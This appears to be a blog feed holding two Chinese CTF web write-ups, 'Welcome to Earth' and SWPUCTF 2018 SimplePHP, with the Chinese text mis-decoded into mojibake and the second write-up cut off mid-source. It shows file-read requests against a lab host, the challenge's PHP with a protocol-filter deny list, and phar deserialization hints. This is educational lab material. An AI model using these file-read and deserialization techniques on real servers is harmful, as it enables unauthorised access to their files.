    <url>/2024/02/03/2024-2-3-Welcome%20to%20Earth/</url>
    
    <content type="html"><![CDATA[<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150044781.png" alt="image-20240129150044781"></p><h2 id="æŸ¥çœ‹ç½‘é¡µæºä»£ç "><a href="#æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="headerlink" title="æŸ¥çœ‹ç½‘é¡µæºä»£ç :"></a>æŸ¥çœ‹ç½‘é¡µæºä»£ç :</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150131509.png" alt="image-20240129150131509"></p><p>æ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯,ä½†æ˜¯ç½‘é¡µçš„ç½‘å€ä¸Šå‡ºç°&#x2F;die&#x2F;,çŒœæµ‹æ˜¯è¿›è¡Œäº†è·³è½¬ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®<a href="http://338a8f82-3c56-43a6-ba8e-a8c56b8f2b4f.node5.buuoj.cn:81/,%E5%B9%B6%E6%8A%93%E5%8C%85">http://338a8f82-3c56-43a6-ba8e-a8c56b8f2b4f.node5.buuoj.cn:81/,å¹¶æŠ“åŒ…</a>:<br><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150309168.png" alt="image-20240129150309168"></p><h2 id="å‘ç°å­˜åœ¨ä¸€ä¸ª-chase-è®¿é—®ä¸€ä¸‹"><a href="#å‘ç°å­˜åœ¨ä¸€ä¸ª-chase-è®¿é—®ä¸€ä¸‹" class="headerlink" title="å‘ç°å­˜åœ¨ä¸€ä¸ª&#x2F;chase&#x2F;,è®¿é—®ä¸€ä¸‹:"></a>å‘ç°å­˜åœ¨ä¸€ä¸ª&#x2F;chase&#x2F;,è®¿é—®ä¸€ä¸‹:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150349909.png" alt="image-20240129150349909"></p><h2 id="å“åº”ä¸­å‘ç°äº†-leftt-è®¿é—®ä¸€ä¸‹"><a href="#å“åº”ä¸­å‘ç°äº†-leftt-è®¿é—®ä¸€ä¸‹" class="headerlink" title="å“åº”ä¸­å‘ç°äº†&#x2F;leftt&#x2F;,è®¿é—®ä¸€ä¸‹:"></a>å“åº”ä¸­å‘ç°äº†&#x2F;leftt&#x2F;,è®¿é—®ä¸€ä¸‹:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150431580.png" alt="image-20240129150431580"></p><h2 id="å‘ç°å“åº”ä¸­æœ‰-shoot-è®¿é—®ä¸€ä¸‹"><a href="#å‘ç°å“åº”ä¸­æœ‰-shoot-è®¿é—®ä¸€ä¸‹" class="headerlink" title="å‘ç°å“åº”ä¸­æœ‰&#x2F;shoot&#x2F;,è®¿é—®ä¸€ä¸‹:"></a>å‘ç°å“åº”ä¸­æœ‰&#x2F;shoot&#x2F;,è®¿é—®ä¸€ä¸‹:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150512943.png" alt="image-20240129150512943"></p><h2 id="å‘ç°å“åº”ä¸­å­˜åœ¨-door-è®¿é—®ä¸€ä¸‹ï¼š"><a href="#å‘ç°å“åº”ä¸­å­˜åœ¨-door-è®¿é—®ä¸€ä¸‹ï¼š" class="headerlink" title="å‘ç°å“åº”ä¸­å­˜åœ¨&#x2F;door&#x2F;,è®¿é—®ä¸€ä¸‹ï¼š"></a>å‘ç°å“åº”ä¸­å­˜åœ¨&#x2F;door&#x2F;,è®¿é—®ä¸€ä¸‹ï¼š</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150557791.png" alt="image-20240129150557791"></p><h2 id="æ²¡æœ‰ä¿¡æ¯äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹-static-js-door-js"><a href="#æ²¡æœ‰ä¿¡æ¯äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹-static-js-door-js" class="headerlink" title="æ²¡æœ‰ä¿¡æ¯äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹&#x2F;static&#x2F;js&#x2F;door.js:"></a>æ²¡æœ‰ä¿¡æ¯äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹&#x2F;static&#x2F;js&#x2F;door.js:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150649703.png" alt="image-20240129150649703"></p><h2 id="å‘ç°å­˜åœ¨ä¸€ä¸ª-open-è®¿é—®ä¸€ä¸‹"><a href="#å‘ç°å­˜åœ¨ä¸€ä¸ª-open-è®¿é—®ä¸€ä¸‹" class="headerlink" title="å‘ç°å­˜åœ¨ä¸€ä¸ª&#x2F;open&#x2F;,è®¿é—®ä¸€ä¸‹:"></a>å‘ç°å­˜åœ¨ä¸€ä¸ª&#x2F;open&#x2F;,è®¿é—®ä¸€ä¸‹:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150721045.png" alt="image-20240129150721045"></p><h2 id="è®¿é—®ä¸€ä¸‹-static-js-open-sesame-js"><a href="#è®¿é—®ä¸€ä¸‹-static-js-open-sesame-js" class="headerlink" title="è®¿é—®ä¸€ä¸‹&#x2F;static&#x2F;js&#x2F;open_sesame.js:"></a>è®¿é—®ä¸€ä¸‹&#x2F;static&#x2F;js&#x2F;open_sesame.js:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150818071.png" alt="image-20240129150818071"></p><h2 id="å‘ç°å­˜åœ¨ä¸€ä¸ª-fight-è®¿é—®ä¸€ä¸‹"><a href="#å‘ç°å­˜åœ¨ä¸€ä¸ª-fight-è®¿é—®ä¸€ä¸‹" class="headerlink" title="å‘ç°å­˜åœ¨ä¸€ä¸ª&#x2F;fight&#x2F;,è®¿é—®ä¸€ä¸‹:"></a>å‘ç°å­˜åœ¨ä¸€ä¸ª&#x2F;fight&#x2F;,è®¿é—®ä¸€ä¸‹:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150857830.png" alt="image-20240129150857830"></p><h2 id="è®¿é—®ä¸€ä¸‹fight-js"><a href="#è®¿é—®ä¸€ä¸‹fight-js" class="headerlink" title="è®¿é—®ä¸€ä¸‹fight.js:"></a>è®¿é—®ä¸€ä¸‹fight.js:</h2><p><img src="/images/2024-2-3-Welcome_to_Earth/image-20240129150940013.png" alt="image-20240129150940013"></p><h2 id="å‘ç°flagç›¸å…³ä¿¡æ¯"><a href="#å‘ç°flagç›¸å…³ä¿¡æ¯" class="headerlink" title="å‘ç°flagç›¸å…³ä¿¡æ¯:"></a>å‘ç°flagç›¸å…³ä¿¡æ¯:</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">scramble</span>(<span class="hljs-params">flag, key</span>) &#123;<br>    <span class="hljs-comment">// æ ¹æ®keyçš„å€¼å’Œé•¿åº¦é‡æ–°æ’åˆ—flagæ•°ç»„ï¼Œä»è€Œè·å¾—flag</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; key.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">let</span> n = key.<span class="hljs-title function_">charCodeAt</span>(i) % flag.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">let</span> temp = flag[i];<br>        flag[i] = flag[n];<br>        flag[n] = temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_action</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// è·å–id=actionçš„è¾“å…¥æ¡†ä¸­çš„å€¼ï¼Œå³æˆ‘ä»¬è¾“å…¥çš„å€¼</span><br>    <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;action&quot;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-comment">// è¢«æ‰“ä¹±çš„flagæ•°ç»„</span><br>    <span class="hljs-keyword">var</span> flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>];<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-title function_">unscramble</span>(flag, action);<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerText</span> = result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨è„šæœ¬å¤åŸflag"><a href="#ä½¿ç”¨è„šæœ¬å¤åŸflag" class="headerlink" title="ä½¿ç”¨è„šæœ¬å¤åŸflag:"></a>ä½¿ç”¨è„šæœ¬å¤åŸflag:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><span class="hljs-comment"># ä¸€èˆ¬æ¯”èµ›çš„flagéƒ½ä¼šæ˜¯xxxæ¯”èµ›&#123;&#125;</span><br><span class="hljs-comment"># æ‰€ä»¥çŒœæµ‹æœ€ç»ˆflagçš„æ ¼å¼ä¸ºpctf&#123;&#125;</span><br><span class="hljs-comment"># é‡æ–°å¯¹flagè¿›è¡Œç¼–æ’é¡ºåºè¾“å‡ºpctf&#123;&#125;</span><br><br><span class="hljs-comment"># è·å–å¯¹flagåˆ—è¡¨æ‰€æœ‰ç»„åˆæ’åˆ—çš„ç»“æœ,è¿”å›ä¸€ä¸ªè¿­ä»£å™¨</span><br>item = permutations(flag)<br><span class="hljs-comment"># print(item)</span><br><span class="hljs-comment"># éå†itemä¸­æ‰€æœ‰çš„æ’åˆ—ç»„åˆ</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> item:<br>    <span class="hljs-comment"># å°†æ¯ä¸ªæ’åˆ—ç»„åˆè½¬åŒ–ä¸ºliståˆ—è¡¨åï¼Œå°†liståˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ ä¸­é—´ä»¥&#x27;&#x27;çš„æ–¹å¼è¿æ¥åœ¨ä¸€èµ·ï¼Œå½¢æˆæ•´ä¸ªå­—ç¬¦ä¸²èµ‹å€¼ç»™k</span><br>k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(i))<br>    <span class="hljs-comment"># åˆ¤æ–­å­—ç¬¦ä¸²kæ˜¯å¦ä»¥pctf&#123;hey_boyså¼€å¤´ï¼Œç»“å°¾æ˜¯å¦ä»¥&#125;ç»“å°¾</span><br><span class="hljs-keyword">if</span> k.startswith(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="hljs-keyword">and</span> k[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br><span class="hljs-built_in">print</span>(k)<br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;<br>pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;<br>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;<br>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;<br>pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;<br>pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆæµ‹è¯•å¾—åˆ°flag&#x3D;pctf{hey_boys_im_baaaaaaaaaack!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [SWPUCTF 2018]SimplePHP</title>
    <link href="/2024/02/03/2024-2-3-SimplePHP/"/>
    <url>/2024/02/03/2024-2-3-SimplePHP/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><h2 id="æŸ¥çœ‹upload-file-phpçš„å‰ç«¯ä»£ç "><a href="#æŸ¥çœ‹upload-file-phpçš„å‰ç«¯ä»£ç " class="headerlink" title="æŸ¥çœ‹upload_file.phpçš„å‰ç«¯ä»£ç :"></a>æŸ¥çœ‹upload_file.phpçš„å‰ç«¯ä»£ç :</h2><p><img src="/images/2024-2-3-SimplePHP/image-20240131153511696.png" alt="image-20240131153511696"></p><p>å¯ä»¥çŸ¥é“flagåœ¨flag.phpæ–‡ä»¶ä¸­</p><p><img src="/images/2024-2-3-SimplePHP/image-20240131153704971.png" alt="image-20240131153704971"></p><p>åŒæ—¶å‘ç°file.phpå­˜åœ¨æ–‡ä»¶å†…å®¹è¯»å–ç‚¹file,çŒœæµ‹å¯ä»¥åˆ©ç”¨è¯¥æ–‡ä»¶è¯»å–ç‚¹è¯»å–ä¸€äº›æ–‡ä»¶ä¿¡æ¯:</p><h2 id="è¯»å–æ–‡ä»¶ä¿¡æ¯"><a href="#è¯»å–æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è¯»å–æ–‡ä»¶ä¿¡æ¯:"></a>è¯»å–æ–‡ä»¶ä¿¡æ¯:</h2><h3 id="è¯»å–index-phpæ–‡ä»¶ä¿¡æ¯"><a href="#è¯»å–index-phpæ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è¯»å–index.phpæ–‡ä»¶ä¿¡æ¯:"></a>è¯»å–index.phpæ–‡ä»¶ä¿¡æ¯:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">file.php?file=index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131153846994.png" alt="image-20240131153846994"></p><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨ä¸€ä¸ªbase.php</p><h3 id="è¯»å–upload-file-php"><a href="#è¯»å–upload-file-php" class="headerlink" title="è¯»å–upload_file.php:"></a>è¯»å–upload_file.php:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">file.php?file=upload_file.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131154022816.png" alt="image-20240131154022816"></p><h4 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload_file.php:"></a>upload_file.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">upload_file</span>(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;html&gt; <br>&lt;head&gt; <br>&lt;meta charest=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>&lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>&lt;div align = <span class="hljs-string">&quot;center&quot;</span>&gt; <br>        &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; <br>&lt;/div&gt; <br>&lt;style&gt; <br>    p&#123; margin:<span class="hljs-number">0</span> auto&#125; <br>&lt;/style&gt; <br>&lt;div&gt; <br>&lt;form action=<span class="hljs-string">&quot;upload_file.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt; <br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;æ–‡ä»¶å:&lt;/label&gt; <br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;&lt;br&gt; <br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;æäº¤&quot;</span>&gt; <br>&lt;/div&gt; <br><br>&lt;/script&gt; <br>&lt;/body&gt; <br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨function.php</p><h3 id="è¯»å–file-php"><a href="#è¯»å–file-php" class="headerlink" title="è¯»å–file.php:"></a>è¯»å–file.php:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">file.php?file=file.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131154240387.png" alt="image-20240131154240387"></p><h4 id="file-php"><a href="#file-php" class="headerlink" title="file.php:"></a>file.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-comment">// æŒ‡å®šå½“å‰ç¨‹åºPHPåªèƒ½è®¿é—®ä½äº /var/www/html/ ç›®å½•åŠå…¶å­ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚å¦‚æœè„šæœ¬å°è¯•è®¿é—®è¶…å‡ºè¿™ä¸ªç›®å½•èŒƒå›´çš„æ–‡ä»¶ï¼Œå°†ä¼šå—åˆ°é™åˆ¶å¹¶æŠ›å‡ºç›¸åº”çš„é”™è¯¯æˆ–å¼‚å¸¸</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-comment">// è·å–æ–‡ä»¶åä¿¡æ¯</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-comment">// åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-comment">// ç”³è¯·ä¸€ä¸ªshowç±»</span><br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-comment">// åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¯ä»¥ç”¨äºè§¦å‘pharååºåˆ—åŒ–</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-comment">// å±•ç¤ºæ–‡ä»¶ä¿¡æ¯</span><br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="è¯»å–class-php"><a href="#è¯»å–class-php" class="headerlink" title="è¯»å–class.php:"></a>è¯»å–class.php:</h3><h4 id="class-php"><a href="#class-php" class="headerlink" title="class.php:"></a>class.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span 